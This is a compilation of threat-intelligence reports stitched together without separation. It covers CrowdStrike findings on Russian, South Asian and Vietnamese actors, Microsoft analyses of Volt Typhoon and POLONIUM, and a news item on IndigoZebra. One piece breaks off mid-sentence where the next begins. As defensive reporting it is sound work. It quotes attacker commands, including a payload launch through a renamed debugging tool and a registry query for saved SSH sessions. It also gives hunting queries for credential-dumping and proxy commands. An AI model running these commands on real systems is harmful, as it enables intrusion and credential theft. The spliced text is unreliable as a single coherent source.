CrowdStrike Intelligence notes that Russian state-nexus adversaries and pro-Russian information operation (IO) fronts have taken aim at sports regulatory bodies, athletes and events following such bans in the past in retaliation for the exclusion of Russian athletes from international competitions. Based on this historical precedent, CrowdStrike Intelligence assesses that it is highly likely that Russia will respond with targeted intrusions and/or information operations targeting these organizations. Specific targets may include entities with a nexus to the 2020 Tokyo Olympic Games. As Ukraine and Russia work toward ending a five-year conflict, it is likely that Russiaaffiliated intelligence collection operations will continue — if not increase — in the future. CROWDSTRIKE GLOBAL THREAT REPORT 2020 61 INDIAN SUBCONTINENT On August 5, 2019, India’s Modi administration revoked Article 370 of the nation’s constitution, thereby stripping the relative political autonomy that the Indian state of Jammu and Kashmir enjoyed for seven decades. This action, assessed to be a significant deviation from the status quo, immediately preceded an increase in targeted intrusion activity from adversaries linked to India and Pakistan.

These actors include three named adversaries and an unnamed cluster with a suspected affiliation to India. After what appeared to be a one-year hiatus, CrowdStrike Intelligence identified renewed activity from QUILTED TIGER in August 2019. A Kashmir-themed lure was observed delivering the adversary’s bespoke BadNews malware. In August 2019, VICEROY TIGER made alterations to its bespoke BackConfig malware, updating the download mechanism, persistence mechanism and data obfuscation. CrowdStrike Intelligence also detected intermittent use of malicious Android malware, including the tool known as KnSpy, with July activity targeting users associated with the contested Jammu and Kashmir region. Unlike the India-based adversaries, MYTHIC LEOPARD was detected consistently throughout the year. Not only has this adversary continued to target Indian government sector entities, but some operations indicated its target scope is expanding. BitterCircle activity cluster This suspected India-affiliated adversary resumed operations from August to October 2019, using previously identified tools. The actors behind BitterCircle operations target the Chinese and Pakistani government and defense sectors.

Table 10. Targeted Intrusion Adversaries Based on the Indian Subcontinent VIETNAM In late 2018, Vietnam-based OCEAN BUFFALO was implicated in intrusion activity targeting the automotive manufacturing sector. This departure from OCEAN BUFFALO’s target scope of geopolitical intelligence gathering and reconnaissance indicated that Vietnam also has an economic espionage program. Since this time, unconfirmed third-party reporting released details of suspected OCEAN BUFFALO intrusions against automotive sector entities in Germany and South Korea beginning in Spring 2019. Such targeting coincided with 2019 initiatives from the Vietnam Ministry of Industry and Trade designed to support domestic auto projects. At the same time, Vietnamese authorities announced the goal for its auto industry to produce 35% to 40% of domestic auto components by 2020, an increase from 10%. In March 2019, Vietnam also announced its first made-in-Vietnam automobile, produced by VinFast. CrowdStrike Intelligence has assessed that the Vietnam Cyberspace Operations Command (Command 86), which was established in January 2018, likely represents the country’s premier entity for computer network operations.

This assessment carries moderate confidence, as it is based on open-source reporting and brief statements made by Vietnamese officials. Notably, while the components that make up Command 86 are under the direct administration of Vietnam’s Ministry of National Defense (MND), statements from a March 2018 military conference characterized Command 86 as an affiliate of the MND and revealed that its Communist Party of Vietnam (CPV) organization reports directly to the Central Military Commission (CMC), which oversees the MND. New missions for this organization began in April 2018, a few months prior to when OCEAN BUFFALO operations against the automotive industry were observed. Additionally, Command 86’s predecessor organization, the General Staff Department’s Information Technology Department, was founded in 2011, less than a year before the first OCEAN BUFFALO activity was observed. As new information comes to light showing potential new overlaps between Command 86 and OCEAN BUFFALO, these factors will be taken into account in further considerations of the potential connection between the two.

In early 2019, OverWatch threat hunting uncovered a targeted intrusion attributed to OCEAN BUFFALO. OverWatch observed several notable TTPs, including process hollowing, the referencing of video game characters when naming malicious services and the targeting of email inboxes of senior executives. Initial Observations Threat hunting across the organization’s network first identified activity associated with Cobalt Strike on the network, indicating an infection that predated deployment of the CrowdStrike Falcon platform. Hunters found Cobalt Strike payloads running on multiple hosts, hollowing the memory space of various legitimate processes — including Microsoft Word, rundll32.exe and the Windows Server tool esentutl.exe — in order to load. Notable Adversary Behavior OCEAN BUFFALO actors also leveraged renamed versions of Sysinternals DebugView (dbgview.exe) to load the malicious payloads using a naming scheme based on characters from the popular Pokemon video game series. For example, the following malicious service named “herdierbulbasaur” was installed and configured to execute via a renamed version of dbgview.exe: %coMSPEC% /C sTarT "" /B "\\[REDACTED]\C$\shayminlandpichu.

exe" -accepteula -t The interactive adversary behavior initially observed involved testing domain trusts via nltest, likely in preparation for lateral movement, and enumerating previous user logons. The actors also enumerated information from the registry regarding SSH connections made using the PuTTY client, which can assist in gathering credentials and details about account activity across the network: reg query HKCU\Software\SimonTatham\PuTTY\Sessions OVERWATCH FEATURE_ The malicious operators later executed more exhaustive discovery commands and moved laterally via SSH, WMI and SMB share connections. They also attempted credential dumping using a variant of Mimikatz. In addition, the adversary used the legitimate Windows Control Panel process control.exe to execute malicious DLL implants using .cpl file extensions. Further analysis of malware found on the network determined it shared strong similarities with KerrDown, a known OCEAN BUFFALO tool. As OverWatch continued hunting across the environment, evidence of intrusion activity was extensive. The actors targeted an Exchange email server and employed the Microsoft Exchange PowerShell snap-in to grant a compromised valid domain user account access to several user mailboxes.

Discovery and collection actions on the server indicated the adversary’s intent to specifically target email data belonging to senior-level officials. Hunting also found adversary activity on Linux hosts. After successfully employing valid accounts and execution of sudo to elevate privileges, the actors enumerated network connections, edited shell history, viewed sensitive credential files and accessed Puppet configuration files. Linux-based implants were also identified. Conclusions and Recommendations Analysis of the C2 infrastructure used in this intrusion overlapped with that of other suspected OCEAN BUFFALO attacks. When defending against dedicated targeted adversaries as in this case, organizations should be aware that some techniques used in these attacks (e.g., process hollowing to execute Cobalt Strike implants) are not easily mitigated with preventative controls. This is because they are based on the abuse of system features. Therefore, proactive threat hunting is critical for identifying unusual activity as soon as possible. This intrusion also emphasizes the importance of security training and awareness for senior executives, as targeted adversaries are prioritizing those accounts when performing discovery and attempting data collection.

RANSOMWARE Criminally motivated ransomware attacks dominated the headlines in 2019, and there are currently no indications that BGH operators will decrease the pace of their operations. Unlike BOSS SPIDER in 2018, CrowdStrike Intelligence analysis indicates that INDRIK SPIDER remains active following the indictment of individuals associated with the group, a testament to the group’s endurance. Following a profitable year, WIZARD SPIDER, DOPPEL SPIDER and PINCHY SPIDER are also unlikely to rest on their laurels. In addition to traditional criminal enterprises, CrowdStrike Intelligence is investigating possible collaboration between sophisticated eCrime adversaries and state-sponsored targeted intrusions, with initial evidence suggesting some tool overlaps and/or cooperation with intelligence services in DPRK and Russia. Recommendation: Turn it on and push it out! Fully leverage the protection you have. Time and again, CrowdStrike observed successful intrusions in environments where security controls were in place that could have successfully blocked attacks, but were not configured by the organization to do so or were not fully deployed across the environment.

The proliferation of BGH has dramatically increased the impact on organizations that fail to deploy proper protections. Smart organizations will spend the time needed to maximize the protection they gain from existing security controls. CREDENTIALS The year 2019 saw increased use of valid credentials in a wide range of cyberattacks, part of the trend toward malware-free attack techniques. Attackers obtained and leveraged credentials to gain access to systems, move laterally across organizations and establish persistence. As long as organizations continue to use basic user IDs and passwords for authentication, CrowdStrike anticipates this trend will continue. CONCLUSION  CrowdStrike Intelligence reported on data breaches enabled by the compromise of 2FA. Such incidents highlight the vulnerability of this technology and indicate that mobile phones may continue to be a target of opportunity for malicious actors of all motivations. CrowdStrike Intelligence expects malware designed to intercept tokens or take screenshots of authorization messages will continue to be developed.

Statesponsored targeting of mobile platforms will almost certainly be driven by purported domestic security concerns, as exemplified by China’s use of iOS exploit chains against minority communities (reported publicly in August 2019). Recommendation: Protect identities. As a baseline, 2FA should be established for all users because today’s attackers have proven to be adept at accessing and using valid credentials, quickly leading to deeper compromise. Properly deployed, 2FA makes it much more difficult for adversaries to leverage privileged access to achieve their objectives. 2FA is not a panacea, however, and implementing it does not immediately solve the problem of protecting identities. In addition to 2FA, a robust privilege access management process will limit the damage adversaries can do if they get in, and reduce the likelihood of lateral movement. SOCIAL ENGINEERING Network defenders should never underestimate the effectiveness of old-fashioned social engineering techniques. While business email compromise (BEC) scammers and targeted eCrime groups have long used telephone conversations to entice victims to open an email or click on a malicious document, incidents in 2019 showed these tactics being adopted by targeted intrusion actors supporting DPRK and Iranian operations.

Penetration testing tools like the stalwart Cobalt Strike will remain popular and may increasingly be joined by other red-teaming tactics such as CARBON SPIDER’s use of HID (human input device)-emulation USB devices, which was reported in January 2020. Recommendation: Enlist your users in the fight. While technology is clearly critical in the fight to detect and stop intrusions, the end user remains a critical link in the chain to stop breaches. User awareness programs should be initiated to combat the continued threat of phishing and related social engineering techniques. GEOPOLITICAL TENSIONS The very beginning of 2020 was marked by a sudden increase in tensions between Iran and the U.S., including military action undertaken on both sides. Although rhetoric de-escalated by mid-January, CrowdStrike Intelligence assesses that hacktivism, disinformation campaigns on social media in Farsi and English, and an elevated risk of targeted intrusions (including destructive attacks) will remain through at least the first quarter of 2020.

Given previously observed targeting trends, Iran-based targeted intrusion activity is likely to target U.S. and MENA entities in the government, oil and gas, technology and maritime sectors. Iran and Russia have leveraged U.S. social media platforms to develop information operations (IO) campaigns, and recent evidence has demonstrated that China is quickly developing similar disinformation TTPs. The publication of TTPs associated with these operations may lead to less obvious tactics in the coming year, although the intent will remain the same — to promote division within communities. Recommendation: Accept the 1-10-60 challenge. Combating sophisticated adversaries requires a mature process that can prevent, detect and respond to threats with speed and agility. CrowdStrike urges organizations to pursue the “1-10-60 rule” in order to effectively combat sophisticated cyberthreats:  Detect intrusions in under one minute. Investigate and understand threats in under 10 minutes. Contain and eliminate the adversary from the environment in under 60 minutes.

Organizations that meet this 1-10-60 benchmark are much more likely to eradicate the adversary before the attack spreads from its initial entry point, minimizing impact and further escalation. Meeting this challenge requires investment in deep visibility, as well as automated analysis and remediation tools across the enterprise, reducing friction and enabling responders to understand threats and take fast, decisive action. Recommendation: Look for partners to help fill the talent gap. Operating at 1-10-60 velocity also takes more than technology. Defending against sophisticated threats ultimately requires mature processes and effective, dedicated security professionals. Not every organization is equipped to engage in this sort of battle 24/7. Successful enterprises often look outward for help, partnering with best-in-class external solution providers to help fill critical talent gaps in a costeffective manner. CROWDSTRIKE GLOBAL THREAT REPORT 2020 68 CrowdStrike® Inc. (Nasdaq: CRWD), a global cybersecurity leader, is redefining security for the cloud era with an endpoint protection platform built from the ground up to stop breaches.

The CrowdStrike Falcon® platform’s single lightweight-agent architecture leverages cloud-scale artificial intelligence (AI) and offers real-time protection and visibility across the enterprise, preventing attacks on endpoints on or off the network. Powered by the proprietary CrowdStrike Threat Graph®, CrowdStrike Falcon correlates over 3 trillion endpoint-related events per week in real time from across the globe, fueling one of the world’s most advanced data platforms for security. With CrowdStrike, customers benefit from better protection, better performance and immediate time-to-value delivered by the cloud-native Falcon platform. There’s only one thing to remember about CrowdStrike: We stop breaches. 2020 CrowdStrike, Inc. All rights reserved. CrowdStrike, the falcon logo, CrowdStrike Falcon and CrowdStrike Threat Graph are trademarks owned by CrowdStrike, Inc. and registered with the United States Patent and Trademark Office, and in other countries. CrowdStrike owns other trademarks and service marks, and may use the brands of third parties to identify their

Microsoft has uncovered stealthy and targeted malicious activity focused on post-compromise credential access and network system discovery aimed at critical infrastructure organizations in the United States. The attack is carried out by Volt Typhoon, a state-sponsored actor based in China that typically focuses on espionage and information gathering. Microsoft assesses with moderate confidence that this Volt Typhoon campaign is pursuing development of capabilities that could disrupt critical communications infrastructure between the United States and Asia region during future crises.
Volt Typhoon has been active since mid-2021 and has targeted critical infrastructure organizations in Guam and elsewhere in the United States. In this campaign, the affected organizations span the communications, manufacturing, utility, transportation, construction, maritime, government, information technology, and education sectors. Observed behavior suggests that the threat actor intends to perform espionage and maintain access without being detected for as long as possible. Microsoft is choosing to highlight this Volt Typhoon activity at this time because of our significant concern around the potential for further impact to our customers. Although our visibility into these threats has given us the ability to deploy detections to our customers, the lack of visibility into other parts of the actor’s activity compelled us to drive broader community awareness and further investigations and protections across the security ecosystem.
To achieve their objective, the threat actor puts strong emphasis on stealth in this campaign, relying almost exclusively on living-off-the-land techniques and hands-on-keyboard activity. They issue commands via the command line to (1) collect data, including credentials from local and network systems, (2) put the data into an archive file to stage it for exfiltration, and then (3) use the stolen valid credentials to maintain persistence. In addition, Volt Typhoon tries to blend into normal network activity by routing traffic through compromised small office and home office (SOHO) network equipment, including routers, firewalls, and VPN hardware. They have also been observed using custom versions of open-source tools to establish a command and control (C2) channel over proxy to further stay under the radar.
In this blog post, we share information on Volt Typhoon, their campaign targeting critical infrastructure providers, and their tactics for achieving and maintaining unauthorized access to target networks. Because this activity relies on valid accounts and living-off-the-land binaries (LOLBins), detecting and mitigating this attack could be challenging. Compromised accounts must be closed or changed. At the end of this blog post, we share more mitigation steps and best practices, as well as provide details on how Microsoft 365 Defender detects malicious and suspicious activity to protect organizations from such stealthy attacks. The National Security Agency (NSA) has also published a Cybersecurity Advisory [PDF] which contains a hunting guide for the tactics, techniques, and procedures (TTPs) discussed in this blog.
As with any observed nation-state actor activity, Microsoft has directly notified targeted or compromised customers, providing them with important information needed to secure their environments. To learn about Microsoft’s approach to threat actor tracking, read Microsoft shifts to a new threat actor naming taxonomy.
Figure 1. Volt Typhoon attack diagram Initial access Volt Typhoon achieves initial access to targeted organizations through internet-facing Fortinet FortiGuard devices. Microsoft continues to investigate Volt Typhoon’s methods for gaining access to these devices.
The threat actor attempts to leverage any privileges afforded by the Fortinet device, extracts credentials to an Active Directory account used by the device, and then attempts to authenticate to other devices on the network with those credentials.
Volt Typhoon proxies all its network traffic to its targets through compromised SOHO network edge devices (including routers). Microsoft has confirmed that many of the devices, which include those manufactured by ASUS, Cisco, D-Link, NETGEAR, and Zyxel, allow the owner to expose HTTP or SSH management interfaces to the internet. Owners of network edge devices should ensure that management interfaces are not exposed to the public internet in order to reduce their attack surface. By proxying through these devices, Volt Typhoon enhances the stealth of their operations and lowers overhead costs for acquiring infrastructure.
Post-compromise activity Once Volt Typhoon gains access to a target environment, they begin conducting hands-on-keyboard activity via the command line. Some of these commands appear to be exploratory or experimental, as the operators adjust and repeat them multiple times.
Volt Typhoon rarely uses malware in their post-compromise activity. Instead, they rely on living-off-the-land commands to find information on the system, discover additional devices on the network, and exfiltrate data. We describe their activities in the following sections, including the most impactful actions that relate to credential access.
Credential access If the account that Volt Typhoon compromises from the Fortinet device has privileged access, they use that account to perform the following credential access activities.
Microsoft has observed Volt Typhoon attempting to dump credentials through the Local Security Authority Subsystem Service (LSASS). The LSASS process memory space contains hashes for the current user’s operating system (OS) credentials.
text Figure 2. Volt Typhoon command to dump LSASS process memory, encoded in Base64
Figure 3. Decoded Base64 of Volt Typhoon command to dump LSASS process memory Volt Typhoon also frequently attempts to use the command-line tool Ntdsutil.exe to create installation media from domain controllers, either remotely or locally. These media are intended to be used in the installation of new domain controllers. The files in the installation media contain usernames and password hashes that the threat actors can crack offline, giving them valid domain account credentials that they could use to regain access to a compromised organization if they lose access.
Figure 4. Volt Typhoon command to remotely create domain controller installation media
Figure 5. Volt Typhoon command to locally create domain controller installation media Discovery Microsoft has observed Volt Typhoon discovering system information, including file system types; drive names, size, and free space; running processes; and open networks. They also attempt to discover other systems on the compromised network using PowerShell, Windows Management Instrumentation Command-line (WMIC), and the ping command. In a small number of cases, the threat actors run system checks to determine if they are operating within a virtualized environment.
Collection In addition to operating system and domain credentials, Volt Typhoon dumps information from local web browser applications. Microsoft has also observed the threat actors staging collected data in password-protected archives.
Command and control In most cases, Volt Typhoon accesses compromised systems by signing in with valid credentials, the same way authorized users do. However, in a small number of cases, Microsoft has observed Volt Typhoon operators creating proxies on compromised systems to facilitate access. They accomplish this with the built-in netsh portproxy command.
a screen shot of a computer Figure 6. Volt Typhoon commands creating and later deleting a port proxy on a compromised system In rare cases, they also use custom versions of open-source tools Impacket and Fast Reverse Proxy (FRP) to establish a C2 channel over proxy.
Compromised organizations will observe C2 access in the form of successful sign-ins from unusual IP addresses. The same user account used for these sign-ins may be linked to command-line activity conducting further credential access. Microsoft will continue to monitor Volt Typhoon and track changes in their activity and tooling.
Mitigation and protection guidance Mitigating risk from adversaries like Volt Typhoon that rely on valid accounts and living-off-the-land binaries (LOLBins) is particularly challenging. Detecting activity that uses normal sign-in channels and system binaries requires behavioral monitoring. Remediation requires closing or changing credentials for compromised accounts. Suspected compromised accounts or affected systems should be investigated:
Identify LSASS dumping and domain controller installation media creation to identify affected accounts. Examine the activity of compromised accounts for any malicious actions or exposed data. Close or change credentials for all compromised accounts. Depending on the level of collection activity, many accounts may be affected. Defending against this campaign Mitigate the risk of compromised valid accounts by enforcing strong multi-factor authentication (MFA) policies using hardware security keys or Microsoft Authenticator. Passwordless sign-in, password expiration rules, and deactivating unused accounts can also help mitigate risk from this access method. Reduce the attack surface. Microsoft customers can turn on the following attack surface reduction rules to block or audit some observed activity associated with this threat: Block credential stealing from the Windows local security authority subsystem (lsass.exe).Block process creations originating from PSExec and WMI commands. Some organizations may experience compatibility issues with this rule on certain server systems but should deploy it to other systems to prevent lateral movement originating from PsExec and WMI. Block execution of potentially obfuscated scripts. Harden the LSASS process by enabling Protective Process Light (PPL) for LSASS on Windows 11 devices. New, enterprise-joined Windows 11 (22H2 update) installs have this feature enabled by default. In addition, enable Windows Defender Credential Guard, which is also turned on by default for organizations using the Enterprise edition of Windows 11. Turn on cloud-delivered protection in Microsoft Defender Antivirus to cover rapidly evolving attacker tools, techniques, and behaviors such as those exhibited by Volt Typhoon. Run endpoint detection and response (EDR) in block mode so that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus does not detect the threat, or when Microsoft Defender Antivirus is running in passive mode. EDR in block mode works behind the scenes to remediate malicious artifacts that are detected post-compromise. Detection details and hunting queries Microsoft Defender Antivirus Microsoft Defender Antivirus detects attempted post-compromise activity. Note, however, that these alerts can also be triggered by threat activity unrelated to Volt Typhoon. Turn on cloud-delivered protection to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block most new and unknown threats.
Behavior:Win32/SuspNtdsUtilUsage.A Behavior:Win32/SuspPowershellExec.E Behavior:Win32/SuspRemoteCmdCommandParent.A Behavior:Win32/UNCFilePathOperation Behavior:Win32/VSSAmsiCaller.A Behavior:Win32/WinrsCommand.A Behavior:Win32/WmiSuspProcExec.J!se Behavior:Win32/WmicRemote.A Behavior:Win32/WmiprvseRemoteProc.B Microsoft Defender for Endpoint Microsoft Defender for Endpoint alerts with the following titles can indicate possible presence of Volt Typhoon activity.
Volt Typhoon threat actor detected The following alerts may also be associated with Volt Typhoon activity. Note, however, that these alerts can also be triggered by threat activity unrelated to Volt Typhoon.
A machine was configured to forward traffic to a non-local address Ntdsutil collecting Active Directory information Password hashes dumped from LSASS memory Suspicious use of wmic.exe to execute code Impacket toolkit Hunting queries Microsoft 365 Defender Volt Typhoon’s post-compromise activity usually includes distinctive commands. Searching for these can help to determine the scope and impact of an incident.
Find commands creating domain controller installation media
This query can identify domain controller installation media creation commands similar to those used by Volt Typhoon.
DeviceProcessEvents | where ProcessCommandLine has_all ("ntdsutil", "create full", "pro") Find commands establishing internal proxies
This query can identify commands that establish internal proxies similar to those used by Volt Typhoon.
DeviceProcessEvents | where ProcessCommandLine has_all ("portproxy", "netsh", "wmic", "process call create", "v4tov4") Find detections of custom FRP executables
This query can identify alerts on files that match the SHA-256 hashes of known Volt Typhoon custom FRP binaries.
AlertEvidence | where SHA256 in
('baeffeb5fdef2f42a752c65c2d2a52e84fb57efc906d981f89dd518c314e231c',
'b4f7c5e3f14fb57be8b5f020377b993618b6e3532a4e1eb1eae9976d4130cc74',
'4b0c4170601d6e922cf23b1caf096bba2fade3dfcf92f0ab895a5f0b9a310349',
'c0fc29a52ec3202f71f6378d9f7f9a8a3a10eb19acb8765152d758aded98c76d',
'd6ab36cb58c6c8c3527e788fc9239d8dcc97468b6999cf9ccd8a815c8b4a80af',
'9dd101caee49c692e5df193b236f8d52a07a2030eed9bd858ed3aaccb406401a',
'450437d49a7e5530c6fb04df2e56c3ab1553ada3712fab02bd1eeb1f1adbc267',
'93ce3b6d2a18829c0212542751b309dacbdc8c1d950611efe2319aa715f3a066',
'7939f67375e6b14dfa45ec70356e91823d12f28bbd84278992b99e0d2c12ace5',
'389a497f27e1dd7484325e8e02bbdf656d53d5cf2601514e9b8d8974befddf61',
'c4b185dbca490a7f93bc96eefb9a597684fdf532d5a04aa4d9b4d4b1552c283b',
'e453e6efc5a002709057d8648dbe9998a49b9a12291dee390bb61c98a58b6e95',
'6036390a2c81301a23c9452288e39cb34e577483d121711b6ba6230b29a3c9ff',
'cd69e8a25a07318b153e01bba74a1ae60f8fc28eb3d56078f448461400baa984',
'17506c2246551d401c43726bdaec800f8d41595d01311cf38a19140ad32da2f4',
'8fa3e8fdbaa6ab5a9c44720de4514f19182adc0c9c6001c19cf159b79c0ae9c2',
'd17317e1d5716b09cee904b8463a203dc6900d78ee2053276cc948e4f41c8295',
'472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d',
'3e9fc13fab3f8d8120bd01604ee50ff65a40121955a4150a6d2c007d34807642') Microsoft Sentinel
Below are some suggested queries to assist Microsoft Sentinel customers in identifying Volt Typhoon activity in their environment:
LSASS process memory dumping Potential Impacket execution Domain controller installation media creation commands similar to those used by Volt Typhoon Commands that set up internal proxies resembling the ones employed by Volt Typhoon Microsoft customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious hash indicators (related to the custom Fast Reverse Proxy binaries) mentioned in this blog post. These analytics are part of the Threat Intelligence solution and can be installed from the Microsoft Sentinel Content Hub if not currently deployed. More details on the Content Hub can be found here: https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy.
Indicators of compromise (IOCs) The below list provides IOCs observed during our investigation. We encourage our customers to investigate these indicators in their environments and implement detections and protection to identify past related activity and prevent future attacks against their systems.
Volt Typhoon custom FRP executable (SHA-256):
baeffeb5fdef2f42a752c65c2d2a52e84fb57efc906d981f89dd518c314e231c b4f7c5e3f14fb57be8b5f020377b993618b6e3532a4e1eb1eae9976d4130cc74 4b0c4170601d6e922cf23b1caf096bba2fade3dfcf92f0ab895a5f0b9a310349 c0fc29a52ec3202f71f6378d9f7f9a8a3a10eb19acb8765152d758aded98c76d d6ab36cb58c6c8c3527e788fc9239d8dcc97468b6999cf9ccd8a815c8b4a80af 9dd101caee49c692e5df193b236f8d52a07a2030eed9bd858ed3aaccb406401a 450437d49a7e5530c6fb04df2e56c3ab1553ada3712fab02bd1eeb1f1adbc267 93ce3b6d2a18829c0212542751b309dacbdc8c1d950611efe2319aa715f3a066 7939f67375e6b14dfa45ec70356e91823d12f28bbd84278992b99e0d2c12ace5 389a497f27e1dd7484325e8e02bbdf656d53d5cf2601514e9b8d8974befddf61 c4b185dbca490a7f93bc96eefb9a597684fdf532d5a04aa4d9b4d4b1552c283b e453e6efc5a002709057d8648dbe9998a49b9a12291dee390bb61c98a58b6e95 6036390a2c81301a23c9452288e39cb34e577483d121711b6ba6230b29a3c9ff cd69e8a25a07318b153e01bba74a1ae60f8fc28eb3d56078f448461400baa984 17506c2246551d401c43726bdaec800f8d41595d01311cf38a19140ad32da2f4 8fa3e8fdbaa6ab5a9c44720de4514f19182adc0c9c6001c19cf159b79c0ae9c2 d17317e1d5716b09cee904b8463a203dc6900d78ee2053276cc948e4f41c8295 472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d 3e9fc13fab3f8d8120bd01604ee50ff65a40121955a4150a6d2c007d34807642Cybersecurity researchers are warning of ongoing attacks coordinated by a suspected Chinese-speaking threat actor targeting the Afghanistan government as part of an espionage campaign that may have had its provenance as far back as 2014. Israeli cybersecurity firm Check Point Research attributed the intrusions to a hacking group tracked under the moniker "IndigoZebra," with past activity aimed at other central-Asian countries, including Kyrgyzstan and Uzbekistan. "The threat actors behind the espionage leveraged Dropbox, the popular cloud-storage service, to infiltrate the Afghan National Security Council (NSC)," the researchers said in a technical write-up shared with The Hacker News, adding they "orchestrated a ministry-to-ministry style deception, where an email is sent to a high-profile target from the mailboxes of another high-profile victim."

UPCOMING WEBINAR
From USER to ADMIN: Learn How Hackers Gain Full Control
Discover the secret tactics hackers use to become admins, how to detect and block it before it's too late.

Register for our webinar today. Join Now
IndigoZebra first came to light in August 2017 when Kaspersky detailed a covert operation that singled out former Soviet Republics with a wide swath of malware such as Meterpreter, Poison Ivy RAT, xDown, and a previously undocumented piece of malware called xCaon. Check Point's investigation into the attacks commenced in April when NSC officials began receiving lure emails allegedly claiming to be from the Administrative Office of the President of Afghanistan. While the message urged the recipients to review modifications in an attached document related to a pending NSC press conference, opening the decoy file — a password-protected RAR archive ("NSC Press conference.rar") — was found to trigger an infection chain that culminated in the installation of a backdoor ("spools.exe") on the targeted system. Additionally, the attacks funneled malicious commands into the victim machine that were camouflaged using the Dropbox API, with the implant creating a unique folder for every compromised host in an attacker-controlled Dropbox account.

The backdoor, dubbed "BoxCaon," is capable of stealing confidential data stored on the device, running arbitrary commands, and exfiltrating the results back to the Dropbox folder. The commands ("c.txt") themselves are placed in a separate sub-folder named "d" in the victim's Dropbox folder, which is retrieved by the malware prior to execution. Cybersecurity
BoxCaon's connection to IndigoZebra stems from similarities shared by the malware with xCaon. Check Point said it identified about 30 different samples of xCaon — the earliest dating back to 2014 — all of which rely on HTTP protocol for command-and-control communications. Telemetry data analyzed by the researchers also found that the HTTP variants primarily set their sights on political entities located in Kyrgyzstan and Uzbekistan, suggesting a shift in targeting in recent years along with a revamped toolset. "What is remarkable here is how the threat actors utilized the tactic of ministry-to-ministry deception," said Lotem Finkelsteen, head of threat intelligence at Check Point.

"This tactic is vicious and effective in making anyone do anything for you; and in this case, the malicious activity was seen at the highest levels of sovereignty. Furthermore, it's noteworthy how the threat actors utilize Dropbox to mask themselves from detection."

April 2023 update – Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. POLONIUM is now tracked as Plaid Rain and MERCURY is now tracked as Mango Sandstorm. The DEV-#### designations are now tracked under the name Storm-#### using the same four-digit identifier.
To learn about how the new taxonomy represents the origin, unique traits, and impact of threat actors, and to get a complete mapping of threat actor names, read this blog: Microsoft shifts to a new threat actor naming taxonomy. Microsoft successfully detected and disabled attack activity abusing OneDrive by a previously undocumented Lebanon-based activity group Microsoft Threat Intelligence Center (MSTIC) tracks as POLONIUM. The associated indicators and tactics were used by the OneDrive team to improve detection of attack activity and disable offending actor accounts.
To further address this abuse, Microsoft has suspended more than 20 malicious OneDrive applications created by POLONIUM actors, notified affected organizations, and deployed a series of security intelligence updates that will quarantine tools developed by POLONIUM operators. Our goal with this blog is to help deter future activity by exposing and sharing the POLONIUM tactics with the community at large. MSTIC assesses with high confidence that POLONIUM represents an operational group based in Lebanon.
We also assess with moderate confidence that the observed activity was coordinated with other actors affiliated with Iran’s Ministry of Intelligence and Security (MOIS), based primarily on victim overlap and commonality of tools and techniques. Such collaboration or direction from Tehran would align with a string of revelations since late 2020 that the Government of Iran is using third parties to carry out cyber operations on their behalf, likely to enhance Iran’s plausible deniability. POLONIUM has targeted or compromised more than 20 organizations based in Israel and one intergovernmental organization with operations in Lebanon over the past three months.
This actor has deployed unique tools that abuse legitimate cloud services for command and control (C2) across most of their victims. POLONIUM was observed creating and using legitimate OneDrive accounts, then utilizing those accounts as C2 to execute part of their attack operation. This activity does not represent any security issues or vulnerabilities on the OneDrive platform.
In addition, MSTIC does not, at present, see any links between this activity and other publicly documented groups linked to Lebanon like Volatile Cedar. This blog will also expose further details that show Iranian threat actors may be collaborating with proxies to operationalize their attacks. Microsoft continues to work across its platforms to identify abuse, take down malicious activity, and implement new proactive protections to discourage malicious actors from using our services.
As with any observed nation-state actor activity, Microsoft directly notifies customers that have been targeted or compromised, providing them with the information they need to secure their accounts. Observed actor activity
Since February 2022, POLONIUM has been observed primarily targeting organizations in Israel with a focus on critical manufacturing, IT, and Israel’s defense industry. In at least one case, POLONIUM’s compromise of an IT company was used to target a downstream aviation company and law firm in a supply chain attack that relied on service provider credentials to gain access to the targeted networks.
Multiple manufacturing companies they targeted also serve Israel’s defense industry, indicating a POLONIUM tactic that follows an increasing trend by many actors, including among several Iranian groups, of targeting service provider access to gain downstream access. Observed victim organizations were in the following sectors: critical manufacturing, information technology, transportation systems, defense industrial base, government agencies and services, food and agriculture, financial services, healthcare and public health, and other business types. POLONIUM TTPs shared with Iran-based nation-state actors
MSTIC assesses with moderate confidence that POLONIUM is coordinating its operations with multiple tracked actor groups affiliated with Iran’s Ministry of Intelligence and Security (MOIS), based on victim overlap and the following common techniques and tooling:

Common unique victim targeting: MSTIC has observed POLONIUM active on or targeting multiple victims that MERCURY previously compromised.
According to the US Cyber Command, MuddyWater, a group we track as MERCURY, “is a subordinate element within the Iranian Ministry of Intelligence and Security.”
Evidence of possible “hand-off” operations: The uniqueness of the victim organizations suggests a convergence of mission requirements with MOIS. It may also be evidence of a ‘hand-off’ operational model where MOIS provides POLONIUM with access to previously compromised victim environments to execute new activity. MSTIC continues to monitor both actors to further verify this ‘hand-off’ hypothesis.
Use of OneDrive for C2:  MSTIC has observed both POLONIUM and DEV-0133 (aka Lyceum) using cloud services, including OneDrive, for data exfiltration and command and control. Use of AirVPN: Both POLONIUM and DEV-0588 (aka CopyKittens) commonly use AirVPN for operational activity. While use of public VPN services is common across many actor sets, these actors’ specific choice to use AirVPN, combined with the additional overlaps documented above, further supports the moderate confidence assessment that POLONIUM collaborates with MOIS.
Abuse of cloud services
POLONIUM has been observed deploying a series of custom implants that utilize cloud services for command and control as well as data exfiltration. MSTIC has observed implants connecting to POLONIUM-owned accounts in OneDrive and Dropbox. These tools are detected as the following malware:

Trojan:PowerShell/CreepyDrive.A!dha
Trojan:PowerShell/CreepyDrive.B!dha
Trojan:PowerShell/CreepyDrive.C!dha
Trojan:PowerShell/CreepyDrive.D!dha
Trojan:PowerShell/CreepyDrive.E!dha
Trojan:MSIL/CreepyBox.A!dha
Trojan:MSIL/CreepyBox.B!dha
Trojan:MSIL/CreepyBox.C!dha
While OneDrive performs antivirus scanning on all uploaded content, POLONIUM is not using the cloud service to host their malware.
